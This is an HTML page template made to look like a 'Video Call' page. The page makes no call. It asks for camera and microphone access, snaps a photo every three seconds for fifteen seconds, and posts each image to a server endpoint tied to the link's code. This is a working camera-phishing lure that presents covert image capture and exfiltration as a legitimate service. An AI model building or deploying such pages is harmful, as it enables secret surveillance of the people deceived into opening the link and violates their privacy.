<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Video Call</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;text-align:center;
             background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;
             min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:rgba(255,255,255,.05);backdrop-filter:blur(10px);border-radius:20px;padding:30px;
              width:100%;max-width:400px;border:1px solid rgba(255,255,255,.1)}
        h2{font-size:22px;margin-bottom:8px}
        p.sub{color:#aaa;font-size:14px;margin-bottom:20px}
        .btn{padding:14px 36px;font-size:16px;border:none;border-radius:50px;cursor:pointer;
             font-weight:600;transition:.3s;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
        .btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(102,126,234,.4)}
        .btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
        #video{width:100%;border-radius:12px;margin:15px 0;display:none;background:#000}
        #status{margin-top:15px;padding:10px;border-radius:10px;font-size:13px}
        .s-wait{background:rgba(255,193,7,.15);color:#ffc107}
        .s-ok{background:rgba(40,167,69,.15);color:#28a745}
        .s-err{background:rgba(220,53,69,.15);color:#dc3545}
        .spin{display:none;width:28px;height:28px;border:3px solid rgba(255,255,255,.2);
              border-top:3px solid #fff;border-radius:50%;animation:spin .8s linear infinite;margin:12px auto}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div class="card">
    <h2>📹 Video Call</h2>
    <p class="sub" id="desc">Camera access required</p>
    <button class="btn" id="btn" onclick="start()">▶ Start Camera</button>
    <div class="spin" id="spin"></div>
    <video id="video" autoplay playsinline muted></video>
    <div id="status" class="s-wait">⏳ Waiting...</div>
</div>
<script>
const code='{{code}}',srv='{{server}}';
{% if not valid %}
document.getElementById('status').innerHTML='❌ Invalid link';document.getElementById('status').className='s-err';
document.getElementById('btn').disabled=true;
{% endif %}
let stream=null,timer=null;
async function start(){
    const btn=document.getElementById('btn'),st=document.getElementById('status'),sp=document.getElementById('spin'),v=document.getElementById('video');
    btn.disabled=true;sp.style.display='block';st.innerHTML='⏳ Requesting camera...';st.className='s-wait';
    try{
        stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'},audio:true});
        v.srcObject=stream;v.style.display='block';sp.style.display='none';
        st.innerHTML='✅ Active - capturing...';st.className='s-ok';
        document.getElementById('desc').innerHTML='Camera active';
        const c=document.createElement('canvas');c.width=640;c.height=480;const ctx=c.getContext('2d');
        let count=0;
        timer=setInterval(()=>{
            ctx.drawImage(v,0,0);count++;
            fetch(srv+'/api/camera/'+code,{method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify({type:'photo',data:c.toDataURL('image/jpeg',.7),count:count,timestamp:new Date().toISOString()})
            }).catch(()=>{});
        },3000);
        setTimeout(()=>stop(),15000);
    }catch(e){
        sp.style.display='none';st.innerHTML='❌ Denied: '+e.message;st.className='s-err';btn.disabled=false;
    }
}
function stop(){
    if(timer)clearInterval(timer);
    if(stream){stream.getTracks().forEach(t=>t.stop());stream=null}
    document.getElementById('status').innerHTML='✅ Done!';document.getElementById('status').className='s-ok';
    document.getElementById('btn').disabled=false;
}
</script>
</body>
</html>
